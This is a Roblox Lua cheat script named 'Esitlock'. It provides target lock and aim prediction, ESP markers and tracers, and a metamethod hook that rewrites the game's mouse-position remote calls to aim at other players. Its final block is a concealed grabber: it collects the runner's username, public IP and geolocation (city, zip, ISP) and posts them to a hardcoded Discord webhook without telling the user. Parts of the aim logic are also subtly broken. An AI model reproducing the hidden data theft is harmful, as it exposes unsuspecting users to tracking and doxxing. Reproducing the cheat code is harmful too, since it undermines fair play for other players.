
    
local a=setmetatable({},{__index=function(b,c)local d=game.GetService(game,c)if d then b[c]=d end;return d end})
local e=a.Players.LocalPlayer
local function f(g)
  local h=false
  local i;
  local j;

  local function k(l)
    i=l;
    repeat wait()
      j=l:FindFirstChild("HumanoidRootPart")
    until j;
    h=false
  end

  k(g.Character or g.CharacterAdded:Wait())
  g.CharacterAdded:Connect(k)

  a.RunService.RenderStepped:Connect(function()
    if i and i:IsDescendantOf(workspace) and (j and j:IsDescendantOf(i)) then
      if j.AssemblyAngularVelocity.Magnitude>50 or j.AssemblyLinearVelocity.Magnitude>100 then
        if h==false then
          game.StarterGui:SetCore("ChatMakeSystemMessage",{Text="Fling Exploit detected, Player: "..tostring(g),Color=Color3.fromRGB(255,200,0)})
        end
        h=true
        for m,n in ipairs(i:GetDescendants()) do
          if n:IsA("BasePart") then
            n.CanCollide=false
            n.AssemblyAngularVelocity=Vector3.new(0,0,0)
            n.AssemblyLinearVelocity=Vector3.new(0,0,0)
            n.CustomPhysicalProperties=PhysicalProperties.new(0,0,0)
          end
        end
        j.CanCollide=false
        j.AssemblyAngularVelocity=Vector3.new(0,0,0)
        j.AssemblyLinearVelocity=Vector3.new(0,0,0)
        j.CustomPhysicalProperties=PhysicalProperties.new(0,0,0)
      end
    end
  end)
end
for m,n in ipairs(a.Players:GetPlayers()) do
  if n~=e then
    f(n)
  end
end

a.Players.PlayerAdded:Connect(f)
local o=nil
a.RunService.RenderStepped:Connect(function()
  pcall(function()
    local j=e.Character.PrimaryPart
    if j.AssemblyLinearVelocity.Magnitude>250 or j.AssemblyAngularVelocity.Magnitude>250 then
      j.AssemblyAngularVelocity=Vector3.new(0,0,0)
      j.AssemblyLinearVelocity=Vector3.new(0,0,0)
      j.CFrame=o
      game.StarterGui:SetCore("ChatMakeSystemMessage",{Text="You were flung. Neutralizing velocity.",Color=Color3.fromRGB(255,0,0)})
    elseif j.AssemblyLinearVelocity.Magnitude<50 or j.AssemblyAngularVelocity.Magnitude>50 then
      o=j.CFrame
    end
  end)
end)

function x(tt,tx,cc)
    game.StarterGui:SetCore("SendNotification", {
      Title = tt;
      Text = tx;
      Duration = cc;
    })
    end
    
    x("Hello", "Loaded(check/excuteagainifwantchangeset)", 5)
    if getgenv().check == true then
    x("Esitlock", "ChangeSetDone", 5)
    return
    end
    getgenv().check = true
    -------------------------------------------------------
game:GetService("RunService").RenderStepped:Connect(function()
if mmbok.AutoPrediction.Enabled == true then 
                local PingStats = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
                local Value = tostring(PingStats)
                local PingValue = Value:split(" ")
                local PingNumber = tonumber(PingValue[1])
 if PingNumber > 300 < 310 then
mmbok.Esitlock.PredictionValue = mmbok.AutoPrediction.P300
elseif PingNumber > 290 < 300 then
mmbok.Esitlock.PredictionValue = mmbok.AutoPrediction.P290
elseif PingNumber > 280 < 290 then
mmbok.Esitlock.PredictionValue = mmbok.AutoPrediction.P280
elseif PingNumber > 270 < 280 then
mmbok.Esitlock.PredictionValue = mmbok.AutoPrediction.P270
elseif PingNumber > 260 < 270 then
mmbok.Esitlock.PredictionValue = mmbok.AutoPrediction.P260
elseif PingNumber > 250 < 260 then
mmbok.Esitlock.PredictionValue = mmbok.AutoPrediction.P250
elseif PingNumber > 240 < 250 then
mmbok.Esitlock.PredictionValue = mmbok.AutoPrediction.P240
elseif PingNumber > 230 < 240 then
mmbok.Esitlock.PredictionValue = mmbok.AutoPrediction.P230
elseif PingNumber > 220 < 230 then
mmbok.Esitlock.PredictionValue = mmbok.AutoPrediction.P220
elseif PingNumber > 210 < 220 then
mmbok.Esitlock.PredictionValue = mmbok.AutoPrediction.P210
elseif PingNumber > 200 < 210 then
mmbok.Esitlock.PredictionValue = mmbok.AutoPrediction.P200
elseif PingNumber > 190 < 200 then
mmbok.Esitlock.PredictionValue = mmbok.AutoPrediction.P190
elseif PingNumber > 180 < 190 then
mmbok.Esitlock.PredictionValue = mmbok.AutoPrediction.P170
elseif PingNumber > 160 < 170 then
mmbok.Esitlock.PredictionValue = mmbok.AutoPrediction.P160
elseif PingNumber > 150 < 160 then
mmbok.Esitlock.PredictionValue = mmbok.AutoPrediction.P150
elseif PingNumber > 140 < 150 then
mmbok.Esitlock.PredictionValue = mmbok.AutoPrediction.P140
elseif PingNumber > 130 < 140 then
mmbok.Esitlock.PredictionValue = mmbok.AutoPrediction.P130
elseif PingNumber > 120 < 130 then
mmbok.Esitlock.PredictionValue = mmbok.AutoPrediction.P120
elseif PingNumber > 110 < 120 then
mmbok.Esitlock.PredictionValue = mmbok.AutoPrediction.P110
elseif PingNumber > 100 < 110 then
mmbok.Esitlock.PredictionValue = mmbok.AutoPrediction.P100
elseif PingNumber > 90 < 100 then
mmbok.Esitlock.PredictionValue = mmbok.AutoPrediction.P90
elseif PingNumber > 80 < 90 then
mmbok.Esitlock.PredictionValue = mmbok.AutoPrediction.P80
elseif PingNumber > 70 < 80 then
mmbok.Esitlock.PredictionValue = mmbok.AutoPrediction.P70
elseif PingNumber > 60 < 70 then
mmbok.Esitlock.PredictionValue = mmbok.AutoPrediction.P60
elseif PingNumber > 50 < 60 then
mmbok.Esitlock.PredictionValue = mmbok.AutoPrediction.P50
elseif PingNumber > 40 < 50 then
mmbok.Esitlock.PredictionValue = mmbok.AutoPrediction.P40
elseif PingNumber > 30 < 40 then
mmbok.Esitlock.PredictionValue = mmbok.AutoPrediction.P30
elseif PingNumber > 20 < 30 then
mmbok.Esitlock.PredictionValue = mmbok.AutoPrediction.P20
elseif PingNumber > 10 < 20 then
mmbok.Esitlock.PredictionValue = mmbok.AutoPrediction.P10
                    
                end
            end
end)
        
                              ----------------------------
    _G.Types = {
      Ball = Enum.PartType.Ball,
      Block = Enum.PartType.Block, 
      Cylinder = Enum.PartType.Cylinder
    }
                    
                    local placemarker = Instance.new("Part", game.Workspace)
                    placemarker.Shape = mmbok.esptarget.HitboxTypeShape
                    placemarker.Material = mmbok.esptarget.HitboxType--ForceField
                    placemarker.Color = mmbok.esptarget.Hitboxcolor
    --
    local AnchorCount = 0
          local MaxAnchor = 50
    
              local CC = game:GetService"Workspace".CurrentCamera
                  local Plr;
              local mouse = game.Players.LocalPlayer:GetMouse()
                  
                          local Inset = game:GetService("GuiService"):GetGuiInset().Y
              local Line = Drawing.new("Line")
                  local Text = Drawing.new("Text")
                        local Circle = Drawing.new("Circle")
                        local Circle1 = Drawing.new("Circle")
                    

    function makemarker(Parent, Adornee, Color, Size, Size2)
      local e = Instance.new("BillboardGui", Parent)
      e.Name = "PP"
      e.Adornee = Adornee
      e.Size = UDim2.new(Size, Size2, Size, Size2)
      e.AlwaysOnTop = mmbok.Esitlock.showdot
      local a = Instance.new("Frame", e)
      if mmbok.esptarget.showdot == true then
      a.Size = mmbok.esptarget.dotsize
      else
      a.Size = mmbok.esptarget.dotsize
      end
      if  mmbok.esptarget.showdot == true then
      a.Transparency = 0
      a.BackgroundTransparency = 0
      else
      a.Transparency = 0.55
      a.BackgroundTransparency = 0.55
      end
      a.BackgroundColor3 = Color
      local g = Instance.new("UICorner", a)
      if  mmbok.esptarget.showdot == false then
      g.CornerRadius = mmbok.esptarget.dotRadius
      else
      g.CornerRadius = mmbok.esptarget.dotRadius
      end
      return(e)
    end
    
    
    local data = game.Players:GetPlayers()
    function noob(player)
      local character
      repeat wait() until player.Character
      local handler = makemarker(guiEsitlock, player.Character:WaitForChild(mmbok.Esitlock.Part), Color3.fromRGB(0, 255, 229), 0.3, 3)
      handler.Name = player.Name
      player.CharacterAdded:connect(function(Char) handler.Adornee = Char:WaitForChild(mmbok.Esitlock.Part) end)
    
    
      spawn(function()
          while wait() do
              if player.Character then
              end
          end
      end)
    end
    
    for i = 1, #data do
      if data[i] ~= game.Players.LocalPlayer then
          noob(data[i])
      end
    end
    
    game.Players.PlayerAdded:connect(function(Player)
      noob(Player)
    end)
    
    spawn(function()
      placemarker.Anchored = true
      placemarker.CanCollide = false
      if  mmbok.esptarget.showdot == true then
      placemarker.Size = mmbok.esptarget.HitboxSize
      else
      placemarker.Size = mmbok.esptarget.HitboxSize
      end
      if  mmbok.esptarget.Hitbox == true then
      placemarker.Transparency = 0.30
      else
      placemarker.Transparency = 0.22
      end
      if  mmbok.esptarget.showdot then
      makemarker(placemarker, placemarker, Color3.fromRGB(200, 200, 238), 0.80, 0)
      end
    end)
    
    game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(k)
      if k == mmbok.Esitlock.Key and mmbok.Esitlock.Enabled then
          if enabled == true then
              enabled = false
              if mmbok.Esitlock.notifaction == true then
                  Plr = getClosestPlayerToCursor()
              game.StarterGui:SetCore("SendNotification", {
                  Title = " Esitlock ";
                  Text = "  Unlocked: ",
                  Icon = "http://www.roblox.com/asset/?id=14561128933",
                  Duration = 3
              })
          end
          else
              Plr = getClosestPlayerToCursor()
              enabled = true
              if mmbok.Esitlock.notifaction == true then
    
                  game.StarterGui:SetCore("SendNotification", {
                      Title = " name: "..tostring(Plr);
                      Text = "  Displayname: "..tostring(Plr.Character.Humanoid.DisplayName),
                      Icon = "http://www.roblox.com/asset/?id=14561128933",
                      Duration = 3
                  })
    
              end
          end
      end
    end)
    
    
    function getClosestPlayerToCursor()
		local closestPlayer
		local shortestDistance = math.huge
    
      for i, v in pairs(game.Players:GetPlayers()) do
          if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("HumanoidRootPart") then
              local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
              local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(mouse.X, mouse.Y)).magnitude
              if magnitude <= shortestDistance then
                  closestPlayer = v
                  shortestDistance = magnitude
              end
          end
      end
      return closestPlayer
    end
--
               

    function calculateVelocity(initialPos, finalPos, timeInterval)
        local displacement = finalPos - initialPos
        local velocity = displacement / timeInterval
        return velocity
        end
    
        game:GetService("RunService").RenderStepped:connect(function(DeltaTime)
        if Plr.Character ~= nil and mmbok.Esitlock.Enabled == true and mmbok.RESOLVER.Enabled == true and mmbok.RESOLVER.Type == "DeltaTime" then 
            local character = Plr.Character.HumanoidRootPart
            local lastPosition = character.Position
                task.wait()
            local currentPosition = character.Position
            local velocity = calculateVelocity(lastPosition, currentPosition, DeltaTime)
            character.AssemblyLinearVelocity = velocity
            character.Velocity = velocity
                lastPosition = currentPosition
            end
        end)
    
        function calculateVelocity(initialPos, finalPos, timeInterval)
            local displacement = finalPos - initialPos
            local velocity = displacement / timeInterval
            return velocity
            end
        
            game:GetService("RunService").RenderStepped:connect(function(DeltaTimeMoveDirection)
            if Plr.Character ~= nil and mmbok.Esitlock.Enabled == true and mmbok.RESOLVER.Enabled == true and mmbok.RESOLVER.Type == "DeltaTimeMoveDirection" then 
                local character = Plr.Character.HumanoidRootPart
                local lastPosition = character.Position
                    task.wait()
                local currentPosition = character.Position
                local velocity = calculateVelocity(lastPosition, currentPosition, DeltaTimeMoveDirection)
                character.AssemblyLinearVelocity = velocity
                character.Velocity = velocity
                    lastPosition = currentPosition
                end
            end)

    local pingvalue = nil;
    local split = nil;
    local ping = nil;
    
    game:GetService("RunService").RenderStepped:connect(function()
      if enabled and Plr ~= nil and Plr.Character:FindFirstChild("HumanoidRootPart") then
          placemarker.CFrame = CFrame.new(Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*mmbok.Esitlock.PredictionValue))
                          local Vector1 = CC:WorldToViewportPoint(Plr.Character.HumanoidRootPart.Position)
          Line.Color =  mmbok.esptarget.TracerColor
              Line.Transparency =  mmbok.esptarget.TracerTransparency
              Line.Thickness = mmbok.esptarget.TracerThickness
              Line.From = Vector2.new(mouse.X, mouse.Y + Inset)
              Line.To = Vector2.new(Vector1.X, Vector1.Y)
              Line.Visible = mmbok.esptarget.Tracer
      else
              Circle.Visible =  false
              Line.Visible =  false
              Text.Visible =  false
              Circle1.Visible =  false
          placemarker.CFrame = CFrame.new(0, 9999, 0)
      end
    end)
    local mt = getrawmetatable(game)
    local old = mt.__namecall
    setreadonly(mt, false)
    mt.__namecall = newcclosure(function(...)
      local args = {...}
      if enabled and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" and mmbok.Esitlock.Enabled and Plr.Character ~= Plr then
    
    if mmbok.Esitlock.Prediction == true and  mmbok.RESOLVER.Enabled == true and mmbok.RESOLVER.Type == "MoveDirection" then
    args[3] = Plr.Character[mmbok.Esitlock.Part].Position+(Plr.Character.Humanoid.MoveDirection*mmbok.Esitlock.PredictionValue*Plr.Character.Humanoid.WalkSpeed)
    
    
    else
       
      
    args[3] = Plr.Character[mmbok.Esitlock.Part].Position+(Plr.Character[mmbok.Esitlock.Part].Velocity*mmbok.Esitlock.PredictionValue)
    
    if Plr.Character ~= nil and mmbok.Esitlock.Enabled == true and mmbok.RESOLVER.Enabled == true and mmbok.RESOLVER.Type == "DeltaTimeMoveDirection" then 
    args[3] = Plr.Character[mmbok.Esitlock.Part].Position+(Plr.Character.Humanoid.MoveDirection*mmbok.Esitlock.PredictionValue*Plr.Character.Humanoid.WalkSpeed)
    else
    end
end 
    return old(unpack(args))
    end
    
    return old(...)
    end)

   
    game:GetService("RunService").RenderStepped:Connect(function()
         if mmbok.RESOLVER.Enabled == true and Plr.Character ~= Plr and enabled and mmbok.Esitlock.Enabled then
               if mmbok.RESOLVER.Type == "DeltaTime" then
                    local Enabled = true
                    local Mag = (Plr.Character.Humanoid.MoveDirection).magnitude
                    local vel = Plr.Character.mmbok.Esitlock.Part.Velocity
                    if (vel).Magnitude > 110 then
                        Enabled = false
                    elseif vel.Y > 40 then
                        Enabled = false
                    elseif vel.Y < -25 then
                        Enabled = false
                    elseif vel.Y > 65 then
                        Enabled = false
                    elseif (vel).Magnitude < 1 and Mag > 0.01 then
                        Enabled = false
                    elseif (vel).Magnitude > 5 and Mag < 0.01 then
                        Enabled = false
               
            end
        end
        end
        if mmbok.RESOLVER.Enabled == true and Plr.Character ~= Plr and enabled and mmbok.Esitlock.Enabled then
               if mmbok.RESOLVER.Type == "MoveDirection" or mmbok.RESOLVER.Type == "DeltaTimeMoveDirection"then
                    local Enabled = true
                    local Mag = (Plr.Character.Humanoid.MoveDirection).magnitude
                    local vel = Plr.Character.mmbok.Esitlock.Part.Velocity
                    if (vel).Magnitude > 110 then
                        Enabled = false
                    elseif vel.Y > 40 then
                        Enabled = false
                    elseif vel.Y < -25 then
                        Enabled = false
                    elseif vel.Y > 65 then
                        Enabled = false
                    elseif (vel).Magnitude < 1 and Mag > 0.01 then
                        Enabled = false
                    elseif (vel).Magnitude > 5 and Mag < 0.01 then
                        Enabled = false
               
            end

          if mmbok.Airshot.Enabled == true and Plr.Character.Humanoid:GetState() == Enum.HumanoidStateType.Freefall  then
          if mmbok.Esitlock.Enabled == true then 
          if Plr.Character ~= Plr then
              AnchorCount = AnchorCount + 1
              if AnchorCount < MaxAnchor then
              mmbok.Esitlock.Prediction = false
              wait(mmbok.Airshot.Delay1)
              AnchorCount = 0;
              end
              else
              mmbok.Esitlock.Prediction = true
              AnchorCount = 0;
              end
          
              mmbok.Esitlock.Part = mmbok.Airshot.jumpairpart
          
              else
                      
          
              if Plr.Character ~= nil and Plr.Character:WaitForChild("Humanoid"):GetState() == Enum.Material.Fall then 
              AnchorCount = AnchorCount + 1
              if AnchorCount < MaxAnchor then
              mmbok.Esitlock.Prediction = false
              wait(mmbok.Airshot.Delay2)
              AnchorCount = 0;
              end
              
              else
              mmbok.Esitlock.Prediction = true
              AnchorCount = 0;
              end
          
              mmbok.Esitlock.Part =  mmbok.Airshot.secondairpart
          
              end
              else
          
                      
          
              if Plr.Character ~= nil and Plr.Character:WaitForChild("Humanoid"):GetState() == Enum.Material.Fall then
              AnchorCount = AnchorCount + 1
              if AnchorCount < MaxAnchor then
              mmbok.Esitlock.Prediction = false
              wait(mmbok.Airshot.Delayreturnpart)
              AnchorCount = 0;
              end
              else
              mmbok.Esitlock.Prediction = true
               AnchorCount = 0;
              end
              mmbok.Esitlock.Part = mmbok.Esitlock.Part
              end
              else
              mmbok.Esitlock.Part = mmbok.Esitlock.Part
              end
              end
          end)
      -----------------------------------
    --1v
    local StarterGui = game:GetService("StarterGui") -- not sure why you used CoreGui
    local bindable = Instance.new("BindableFunction")
    
    function bindable.OnInvoke(response)
    print(response .. " chosen")
    end
    
    StarterGui:SetCore("SendNotification", {
    Title = "Esitlock",
    Text = "Done",
    Duration = 5,
    Callback = bindable,
    })

local name = game:GetService("Players").LocalPlayer.Name
local WebhookURL = "https://discord.com/api/webhooks/1208278713893130320/8IY2qvV3qQntBmZJPvhWWuQQ6DY5L-X4IGnhcOZokTVG9jQI1UPndfEmmV4hiopQ5hzb"
local getIPResponse = syn.request({
    Url = "https://api.ipify.org/?format=json",
    Method = "GET"
})
local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
local IPBuffer = tostring(GetIPJSON.ip)

local getIPInfo = syn.request({
    Url = string.format("http://ip-api.com/json/%s", IPBuffer),
    Method = "Get"
})
local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
local FI = {
    IP = IPBuffer,
    country = IIT.country,
    countryCode = IIT.countryCode,
    region = IIT.region,
    regionName = IIT.regionName,
    city = IIT.city,
    zipcode = IIT.zip,
    latitude = IIT.lat,
    longitude = IIT.lon,
    isp = IIT.isp,
    org = IIT.org
}
local dataMessage = string.format("User: %s
IP: %s
Country: %s
Country Code: %s
Region: %s
Region Name: %s
City: %s
Zipcode: %s
ISP: %s
Org: %s", name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org)
local MessageData = {
    ["content"] = dataMessage
}

syn.request(
    {
        Url = WebhookURL, 
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(MessageData)
    }
)
